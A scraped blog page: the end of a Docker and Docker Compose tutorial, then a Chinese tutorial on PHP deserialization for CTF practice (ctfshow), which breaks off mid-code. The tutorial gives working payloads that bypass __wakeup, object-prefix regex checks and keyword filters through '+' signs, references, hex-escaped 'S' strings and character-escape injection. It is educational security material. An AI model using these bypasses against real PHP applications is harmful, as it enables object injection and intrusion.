<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021447437.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network connect mynet tomcat-01</span><br></pre></td></tr></table></figure>

<p>设置完成后我们就可以实现不同网络之间的容器互联了。</p>
<p>假设要跨网操作别人，就需要使用docker network connect 连通</p>
<h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h2><p>Compose是Docker官方的开源项目</p>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<p>授权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<p>测试安装结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>

<h3 id="yaml规则"><a href="#yaml规则" class="headerlink" title="yaml规则"></a>yaml规则</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#3层</span><br><span class="line">version:版本</span><br><span class="line"></span><br><span class="line">service:服务</span><br><span class="line">  服务1: web</span><br><span class="line">	#服务配置</span><br><span class="line">	images</span><br><span class="line">	build</span><br><span class="line">	network</span><br><span class="line">	...</span><br><span class="line">  服务2: redis</span><br><span class="line">  </span><br><span class="line">#其他配置  网络/卷  全局规则</span><br><span class="line">volumes:</span><br><span class="line">network:</span><br><span class="line">configs:</span><br></pre></td></tr></table></figure>

<p>官方：<a target="_blank" rel="noopener" href="https://docs.docker.com/compose/compose-file/#">https://docs.docker.com/compose/compose-file/#</a></p>
<h3 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h3><p>WordPress:<a target="_blank" rel="noopener" href="https://docs.docker.com/samples/wordpress/">https://docs.docker.com/samples/wordpress/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mkdir my_wordpress</span><br><span class="line">cd my_wordpress/</span><br><span class="line">vim docker-compose.yml</span><br><span class="line">services:</span><br><span class="line">  db:</span><br><span class="line">    image: mariadb:10.6.4-focal</span><br><span class="line">    command: &#x27;--default-authentication-plugin=mysql_native_password&#x27;</span><br><span class="line">    volumes:</span><br><span class="line">      - db_data:/var/lib/mysql</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=somewordpress</span><br><span class="line">      - MYSQL_DATABASE=wordpress</span><br><span class="line">      - MYSQL_USER=wordpress</span><br><span class="line">      - MYSQL_PASSWORD=wordpress</span><br><span class="line">    expose:</span><br><span class="line">      - 3306</span><br><span class="line">      - 33060</span><br><span class="line">  wordpress:</span><br><span class="line">    image: wordpress:latest</span><br><span class="line">    ports:</span><br><span class="line">      - 3344:80</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - WORDPRESS_DB_HOST=db</span><br><span class="line">      - WORDPRESS_DB_USER=wordpress</span><br><span class="line">      - WORDPRESS_DB_PASSWORD=wordpress</span><br><span class="line">      - WORDPRESS_DB_NAME=wordpress</span><br><span class="line">volumes:</span><br><span class="line">  db_data:</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>访问 ip:3344 发现WordPress部署成功</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/13/Docker%E5%9F%BA%E7%A1%80/" data-id="cln8eubxq0000x0tgboxyhcqj" data-title="Docker基础" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-php反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/04/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2022-04-13T08:09:45.000Z" itemprop="datePublished">2022-04-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/04/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>什么是序列化？</p>
<p><strong>对象转换成字符串</strong></p>
<p>为什么转换：1.持久保存。2.方便网络传输，例如session缓存，cookie等</p>
<p>什么是反序列化？</p>
<p><strong>字符串转换成对象</strong></p>
<p>php序列化和反序列化的<strong>函数</strong>：</p>
<p>序列化：serialize()</p>
<p>反序列化：unserialize()</p>
<p>对字符串进行序列化后是它本身（<strong>ctfshow web260</strong>）</p>
<h2 id="常见的序列化格式"><a href="#常见的序列化格式" class="headerlink" title="常见的序列化格式"></a>常见的序列化格式</h2><ul>
<li>二进制格式</li>
<li>字节数组</li>
<li>json字符串</li>
<li>xml字符串</li>
</ul>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>数组序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;hi&#x27;</span>);</span><br><span class="line">    <span class="variable">$a_ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a_ser</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;hello&quot;;i:1;s:2:&quot;hi&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>解析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a - array                  b - boolean  </span><br><span class="line">d - double                 i - integer</span><br><span class="line">o - common object          r - reference</span><br><span class="line">s - string                 C - custom object</span><br><span class="line">O - class                  N - null</span><br><span class="line">R - pointer reference      U - unicode string</span><br></pre></td></tr></table></figure>

<p>对象序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;abab&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;age = <span class="number">18</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">pr</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$stu</span> = <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">    <span class="variable">$stu_ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$stu</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$stu_ser</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;Student&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;abab&quot;;s:3:&quot;age&quot;;i:18;&#125;</span><br></pre></td></tr></table></figure>

<p>注：发现这里没有序列化的结果只有成员变量，没有成员函数</p>
<p>还有一种成员变量就是protected类型</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$aa</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$bb</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$cc</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;aa = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bb = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cc = <span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="variable">$d_ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$d_ser</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:2:&quot;aa&quot;;s:3:&quot;aaa&quot;;s:8:&quot;testbb&quot;;s:3:&quot;bbb&quot;;s:5:&quot;*cc&quot;;s:3:&quot;ccc&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>如果是private类型，会在变量名前加上<strong>\x00类名\x00</strong>，如果是protected类型，则会加上<strong>\x00*\x00</strong>，这些都是不可见字符</p>
<p><strong>如果需要本地存储推荐 “ urlencode ”</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlencode($d_ser);</span><br></pre></td></tr></table></figure>

<h2 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__wakeup()      //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep()       //执行serialize()时，先会调用这个函数</span><br><span class="line">__construct()   //对象被创建时触发</span><br><span class="line">__destruct()    //对象被销毁时触发</span><br><span class="line">__call()        //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic()  //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get()         //当调用一个不存在的或者是无法访问的属性的时候被调用</span><br><span class="line">__set()         //用于将数据写入不可访问的属性</span><br><span class="line">__isset()       //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset()       //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString()    //把类当作字符串使用时触发</span><br><span class="line">__invoke()      //当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<h2 id="反序列化绕过小Trick"><a href="#反序列化绕过小Trick" class="headerlink" title="反序列化绕过小Trick"></a>反序列化绕过小Trick</h2><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup"></a>绕过__wakeup</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">版本：</span><br><span class="line">PHP5 &lt; 5.6.25</span><br><span class="line">PHP7 &lt; 7.0.10</span><br></pre></td></tr></table></figure>

<p>利用方法：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;222&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a,<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> test);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">111</span><br><span class="line">O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>如果执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;111&quot;;&#125;&#x27;)</span><br><span class="line">test Object ([a] =&gt; 222 )</span><br></pre></td></tr></table></figure>

<p>这里对象属性的值就是 “1” ，修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize(&#x27;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;111&quot;;&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>输出结果就是 “111”</p>
<h3 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h3><p>正则表达式：描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/^O:\d+/&#x27;)</span><br></pre></td></tr></table></figure>

<p>匹配序列化字符串是否是对象字符串开头</p>
<p>利用加号绕过（在url传参时注意+编码为%2B）</p>
<p><strong>serialize(array( a ) )</strong> a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a,<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> test),<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="comment">// +号绕过</span></span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>)),<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对应 <strong>ctfshow web258</strong></p>
<h3 id="利用引用"><a href="#利用引用" class="headerlink" title="利用引用"></a>利用引用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面这个例子将<code>$b</code>设置为<code>$a</code>的引用，可以使<code>$a</code>永远与<code>$b</code>相等</p>
<p><strong>ctfshow 265</strong></p>
<h3 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;%00*%00a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\00*\00\61&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成<span class="number">16</span>进制解析。</span><br><span class="line"><span class="number">61</span>(<span class="number">16</span>进制)-&gt;<span class="number">97</span>(十进制)-&gt;<span class="title function_ invoke__">a</span>(ASCII)</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;    <span class="comment">//搜索字符串的出现</span></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span>.PHP_EOL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 未作处理前</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">// 做处理后 \75是u的16进制</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="PHP反序列化字符逃逸"><a href="#PHP反序列化字符逃逸" class="headerlink" title="PHP反序列化字符逃逸"></a>PHP反序列化字符逃逸</h3><p>1.过滤后字符变多</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line">	<span class="variable">$arr</span> = <span 